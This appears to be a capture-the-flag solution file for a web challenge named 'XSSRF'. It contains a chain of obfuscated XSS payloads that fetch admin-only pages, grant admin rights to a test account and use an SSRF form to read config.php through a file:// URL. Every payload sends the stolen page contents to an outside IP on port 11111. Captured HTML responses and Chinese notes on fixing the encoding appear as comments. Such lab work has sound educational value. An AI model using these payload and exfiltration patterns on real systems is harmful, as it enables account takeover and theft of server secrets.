xhr = new XMLHttpRequest();
xhr.open('get', '/config.php');
xhr.onreadystatechange = function () {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    document.location = 'http://10.49.146.41:11111/?data=' + encodeURI(xhr.responseText);
  }
};
xhr.send();

xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send('username=test')

payload1 = String.raw`
<svg/onload="xhr=new(XMLHttpRequ\u0065st&#41;;xhr.op\u0065n('get','/'&#41;;xhr.onreadystatechange=function(&#41;{if(xhr.readyState===XMLHttpRequ\u0065st.DONE&&xhr.status===200&#41;{document.location='http://159.65.16.57:11111/?data='+encodeURI(xhr.responseText&#41;;&#125;&#125;;xhr.send(&#41;;">
`
// <!DOCTYPE html>
// <html lang="en">
//   <head>
//     <meta charset="UTF-8">
//     <title>XSSRF</title>
//     <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" media="all">
//     <link rel="stylesheet" href="style.css" media="all">
//   </head>
//   <body>
//     <nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
//   <a class="navbar-brand" href="index.php">XSSRF</a>
//   <ul class="navbar-nav">
//     <li class="nav-item">
//       <a class="nav-link" href="sendmail.php">Send Mail</a>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="mailbox.php">Mailbox</a>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="sentmail.php">Sent Mail</a>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="setadmin.php">Set Admin</a>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="request.php">Send Request</a>
//     </li>
//   </ul>
//   <ul class="navbar-nav ml-auto">
//     <li class="nav-item">
//       <span class="navbar-text">Hello, admin (Administrator)</span>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="logout.php">Logout</a>
//     </li>
//   </ul>
// </nav>
//     <div class="container">
//       <p>
//         Welcome to use corgi mail system.
//         Can you gain access to admin's panel?
//       </p>
//       <img src="/imgs/corgi-6.jpg" alt="Hello">
//     </div>
//   </body>
// </html>

payload2 = String.raw`
<svg/onload="xhr=new(XMLHttpRequ\u0065st&#41;;xhr.op\u0065n('get','/setadmin.php'&#41;;xhr.onreadystatechange=function(&#41;{if(xhr.readyState===XMLHttpRequ\u0065st.DONE&&xhr.status===200&#41;{document.location='http://159.65.16.57:11111/?data='+encodeURI(xhr.responseText&#41;;&#125;&#125;;xhr.send(&#41;;">
`
// <!DOCTYPE html>
// <html lang="en">
//   <head>
//     <meta charset="UTF-8">
//     <title>XSSRF - Set Admin</title>
//     <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" media="all">
//     <link rel="stylesheet" href="style.css" media="all">
//   </head>
//   <body>
// <nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
//   <a class="navbar-brand" href="index.php">XSSRF</a>
//   <ul class="navbar-nav">
//     <li class="nav-item">
//       <a class="nav-link" href="sendmail.php">Send Mail</a>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="mailbox.php">Mailbox</a>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="sentmail.php">Sent Mail</a>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="setadmin.php">Set Admin</a>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="request.php">Send Request</a>
//     </li>
//   </ul>
//   <ul class="navbar-nav ml-auto">
//     <li class="nav-item">
//       <span class="navbar-text">Hello, admin (Administrator)</span>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="logout.php">Logout</a>
//     </li>
//   </ul>
// </nav>
//     <div class="container">
//       <form action="/setadmin.php" method="POST">
//         <div class="form-group">
//           <label for="username">Username</label>
//           <input type="text" name="username" class="form-control" id="username" aria-describedby="username" placeholder="Username">
//         </div>
//         <button class="btn btn-primary">Give Admin Access</button>
//       </form>
//     </div>
//   </body>
// </html>

payload3 = String.raw`
<svg/onload="xhr=new(XMLHttpRequ\u0065st&#41;;xhr.op\u0065n('post','/setadmin.php'&#41;;xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded'&#41;;xhr.onreadystatechange=function(&#41;{if(xhr.readyState===XMLHttpRequ\u0065st.DONE&&xhr.status===200&#41;{document.location='http://159.65.16.57:11111/?data='+encodeURI(xhr.responseText&#41;;&#125;&#125;;xhr.send('username=test'&#41;;">
`
// <!DOCTYPE html>
// <html lang="en">
//   <head>
//     <meta charset="UTF-8">
//     <title>XSSRF - Set Admin</title>
//     <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" media="all">
//     <link rel="stylesheet" href="style.css" media="all">
//   </head>
//   <body>
// <nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
//   <a class="navbar-brand" href="index.php">XSSRF</a>
//   <ul class="navbar-nav">
//     <li class="nav-item">
//       <a class="nav-link" href="sendmail.php">Send Mail</a>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="mailbox.php">Mailbox</a>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="sentmail.php">Sent Mail</a>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="setadmin.php">Set Admin</a>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="request.php">Send Request</a>
//     </li>
//   </ul>
//   <ul class="navbar-nav ml-auto">
//     <li class="nav-item">
//       <span class="navbar-text">Hello, admin (Administrator)</span>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="logout.php">Logout</a>
//     </li>
//   </ul>
// </nav>
//     <div class="container">
//       <div class="alert alert-success">OK, test is admin now.</div>
//       <form action="/setadmin.php" method="POST">
//         <div class="form-group">
//           <label for="username">Username</label>
//           <input type="text" name="username" class="form-control" id="username" aria-describedby="username" placeholder="Username">
//         </div>
//         <button class="btn btn-primary">Give Admin Access</button>
//       </form>
//     </div>
//   </body>
// </html>

payload4 = String.raw`
<svg/onload="xhr=new(XMLHttpRequ\u0065st&#41;;xhr.op\u0065n('get','/request.php'&#41;;xhr.onreadystatechange=function(&#41;{if(xhr.readyState===XMLHttpRequ\u0065st.DONE&&xhr.status===200&#41;{document.location='http://159.65.16.57:11111/?data='+encodeURI(xhr.responseText&#41;;&#125;&#125;;xhr.send(&#41;;">
`
// <!DOCTYPE html>
// <html lang="en">
//   <head>
//     <meta charset="UTF-8">
//     <title>XSSRF - Request</title>
//     <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" media="all">
//     <link rel="stylesheet" href="style.css" media="all">
//     <style>pre { background-color:
// 居然中途断掉了 卧槽是encodeURI的锅 换成deprecated的escape就有了 什么情况
// 因为encodeURI没有把#字符转义掉，导致#之后的内容被浏览器舍弃了（hash mode）
// 而escape将其也转义了

payload4 = String.raw`
<svg/onload="xhr=new(XMLHttpRequ\u0065st&#41;;xhr.op\u0065n('get','/request.php'&#41;;xhr.onreadystatechange=function(&#41;{if(xhr.readyState===XMLHttpRequ\u0065st.DONE&&xhr.status===200&#41;{document.location='http://159.65.16.57:11111/?data='+escape(xhr.responseText&#41;;&#125;&#125;;xhr.send(&#41;;">
`
// <!DOCTYPE html>
// <html lang="en">
//   <head>
//     <meta charset="UTF-8">
//     <title>XSSRF - Request</title>
//     <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" media="all">
//     <link rel="stylesheet" href="style.css" media="all">
//     <style>pre { background-color: #eee; padding: 5px; }</style>
//   </head>
//   <body>
// <nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
//   <a class="navbar-brand" href="index.php">XSSRF</a>
//   <ul class="navbar-nav">
//     <li class="nav-item">
//       <a class="nav-link" href="sendmail.php">Send Mail</a>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="mailbox.php">Mailbox</a>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="sentmail.php">Sent Mail</a>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="setadmin.php">Set Admin</a>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="request.php">Send Request</a>
//     </li>
//   </ul>
//   <ul class="navbar-nav ml-auto">
//     <li class="nav-item">
//       <span class="navbar-text">Hello, admin (Administrator)</span>
//     </li>
//     <li class="nav-item">
//       <a class="nav-link" href="logout.php">Logout</a>
//     </li>
//   </ul>
// </nav>
//     <div class="container">
//       <form action="/request.php" method="POST">
//         <div class="form-group">
//           <label for="url">URL</label>
//           <textarea name="url" class="form-control" id="url" aria-describedby="url" placeholder="URL" rows="10"></textarea>
//         </div>
//         <button class="btn btn-primary">Send Request</button>
//       </form>
//     </div>
//   </body>
// </html>

payload5 = String.raw`
<svg/onload="xhr=new(XMLHttpRequ\u0065st&#41;;xhr.op\u0065n('post','/request.php'&#41;;xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded'&#41;;xhr.onreadystatechange=function(&#41;{if(xhr.readyState===XMLHttpRequ\u0065st.DONE&&xhr.status===200&#41;{document.location='http://159.65.16.57:11111/?data='+encodeURIComponent(xhr.responseText&#41;;&#125;&#125;;xhr.send('url=file:///var/www/html/config.php'&#41;;">
`
